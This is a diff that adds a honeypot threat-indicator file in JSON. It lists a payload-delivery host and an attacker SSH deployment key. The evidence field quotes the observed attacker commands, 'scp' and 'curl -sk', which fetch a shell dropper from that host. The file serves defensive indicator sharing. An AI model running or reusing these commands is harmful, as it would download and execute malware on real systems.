@@ -1,0 +1,24 @@
+{
+  "note": "Attacker infrastructure observed on this honeypot. An address inside a payload URL is the attacker's own host, not a scanner's source; source addresses are never published. No attribution to a person is implied.",
+  "updated": "2026-11-02",
+  "c2": [
+    {
+      "host": "217.60.102.5",
+      "url": "https://217.60.102.5/sh",
+      "kind": "payload-delivery",
+      "first_seen": "2026-10-27T21:51:25Z",
+      "evidence": "fetched by a bot that planted an SSH key and ran 'scp dlr@217.60.102.5:sh', and separately by another host running 'curl -sk https://217.60.102.5/sh'",
+      "serves": "a shell dropper, executed with a 'telnet' argument"
+    }
+  ],
+  "ssh_keys": [
+    {
+      "type": "ssh-ed25519",
+      "fingerprint": "SHA256:O/at8341SoPpKvTPvMsJSgjQm30md9VTS2it25sY0vg",
+      "comment": "dlr@sftp",
+      "public_key": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO94S34m0hVkYFUhtWQe92S9Cp0yJp+7n8gw696Uf/LG",
+      "first_seen": "2026-10-27T21:51:25Z",
+      "note": "deployment key the loader wrote to key.ppk to reach the C2 above; the private half was captured and is not published"
+    }
+  ]
+}
